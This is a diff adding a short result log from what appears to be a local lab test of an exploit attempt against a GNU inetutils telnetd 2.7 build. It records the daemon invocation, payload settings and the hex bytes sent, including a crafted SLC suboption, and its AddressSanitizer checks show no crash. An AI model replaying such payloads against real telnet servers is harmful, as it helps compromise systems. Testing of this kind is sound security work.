@@ -1,0 +1,13 @@
+telnetd=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/inetutils2shell/build/plain-2.7/telnetd/telnetd
+listen=127.0.0.1:37145 (ephemeral, plant-started)
+argv=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/inetutils2shell/build/plain-2.7/telnetd/telnetd --debug=options=3 -h -E /bin/sleep 300
+triplets=5 triplet=42415a payload_len=21
+exploit_sent=True accepted=True subopts_total=2
+greeting=fffd18fffd20fffd23fffd27fffd24fffb03fffd01fffd22fffd1ffffb05fffd21fffa220103fff000fffb01fffd00fffe22fffa2203420000420000420000420000420000fff0
+our_bytes_len=63
+our_bytes_first=fffc18fffc20fffc23fffc27fffc24fffe03fffc01fffb22fffa220342415a42415a42415a42415a42415afff0fffc1ffffe05fffc21fffe01fffc00fffc22
+daemon_exit=-15 alive_before_terminate=True
+asan_error=False
+asan_global_overflow=False
+asan_write1=False
+add_slc_frame=False
